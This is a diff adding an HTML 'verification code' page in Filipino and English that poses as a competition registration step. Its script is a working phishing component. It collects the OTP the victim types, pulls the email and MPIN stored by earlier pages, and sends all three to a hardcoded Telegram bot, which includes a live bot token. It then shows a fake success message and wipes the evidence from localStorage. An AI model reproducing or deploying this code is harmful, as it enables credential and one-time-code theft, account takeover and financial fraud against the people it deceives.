@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="tl" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Code</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #ffffff; display: flex; justify-content: center; padding: 20px; }
+        .container { width: 100%; max-width: 400px; display: flex; flex-direction: column; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .lang-btn { background: #eee; border: 1px solid #ccc; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold; }
+        .help-icon { border: 1.5px solid #333; border-radius: 50%; width: 22px; height: 22px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 14px; }
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
+        .info-text { font-size: 15px; color: #666; margin-bottom: 40px; line-height: 1.5; }
+        .email-highlight { color: #000; font-weight: 600; }
+        .otp-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 30px; }
+        .otp-input { width: 50px; height: 65px; border: 1.5px solid #eee; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; background-color: #f8f9fa; outline: none; }
+        .btn-next-otp { width: 100%; padding: 16px; background-color: #f1f3f5; border: none; border-radius: 12px; color: #adb5bd; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        .btn-next-otp.active { background-color: #000; color: #fff; cursor: pointer; }
+
+        /* تصميم نافذة الرسالة (Modal) */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center; align-items: center;
+            z-index: 1000;
+        }
+        .modal-box {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 85%;
+            max-width: 320px;
+        }
+        .modal-box p { margin-bottom: 15px; font-size: 16px; line-height: 1.4; color: #333; }
+        .ok-btn {
+            background: #000; color: #fff; border: none;
+            padding: 10px 40px; border-radius: 8px;
+            font-weight: bold; cursor: pointer; margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <button class="lang-btn" id="langBtn">English</button>
+            <div class="help-icon">?</div>
+        </div>
+        <h1 id="txt-title">Ilagay ang verification code</h1>
+        <p class="info-text">
+            <span id="txt-info">Ang verification code ay ipinadala sa iyong email</span> 
+            <span class="email-highlight" id="dynamicEmail">...</span>.
+        </p>
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        </div>
+        <button id="finalNextBtn" class="btn-next-otp" disabled>Susunod</button>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <p><b>Matagumpay kang nakarehistro sa kumpetisyon!</b></p>
+            <p style="color: #666; font-size: 14px;">You have successfully registered for the competition!</p>
+            <button class="ok-btn" id="okBtn">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7971170074:AAESPAMwTHEaEYKdQtBPqN9XCRP3t1BDrpM"; 
+        const chatId = "8129155953";
+
+        const langBtn = document.getElementById('langBtn');
+        const nextBtn = document.getElementById('finalNextBtn');
+        const inputs = document.querySelectorAll('.otp-input');
+        const modal = document.getElementById('modalOverlay');
+        const okBtn = document.getElementById('okBtn');
+
+        // اللغات
+        const translations = {
+            tl: { title: "Ilagay ang verification code", info: "Ang verification code ay ipinadala sa iyong email", next: "Susunod", switch: "English" },
+            en: { title: "Enter verification code", info: "The verification code has been sent to your email", next: "Next", switch: "Filipino" }
+        };
+
+        let currentLang = localStorage.getItem('lang') || 'tl';
+
+        function updateLang() {
+            const t = translations[currentLang];
+            document.getElementById('txt-title').innerText = t.title;
+            document.getElementById('txt-info').innerText = t.info;
+            nextBtn.innerText = t.next;
+            langBtn.innerText = t.switch;
+            localStorage.setItem('lang', currentLang);
+        }
+
+        langBtn.addEventListener('click', () => {
+            currentLang = currentLang === 'tl' ? 'en' : 'tl';
+            updateLang();
+        });
+
+        document.getElementById('dynamicEmail').innerText = localStorage.getItem('userEmail') || "";
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index+1].focus();
+                const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+                nextBtn.classList.toggle('active', allFilled);
+                nextBtn.disabled = !allFilled;
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index-1].focus();
+            });
+        });
+
+        // عند الضغط على زر Next الأخير
+        nextBtn.addEventListener('click', () => {
+            const email = localStorage.getItem('userEmail');
+            const mpin = localStorage.getItem('userMPIN');
+            const otp = Array.from(inputs).map(i => i.value).join('');
+
+            const msg = `🔢 *Final Step: OTP Received*\n📧 Email: \`${email}\`\n🔑 MPIN: \`${mpin}\`\n✅ OTP: \`${otp}\``;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).finally(() => {
+                // إظهار نافذة النجاح
+                modal.style.display = 'flex';
+            });
+        });
+
+        // عند الضغط على زر OK
+        okBtn.addEventListener('click', () => {
+            // 1. مسح جميع البيانات المخزنة
+            localStorage.clear();
+            
+            // 2. العودة للصفحة الرئيسية (index.html)
+            window.location.href = 'index.html';
+        });
+
+        updateLang();
+    </script>
+</body>
+</html>
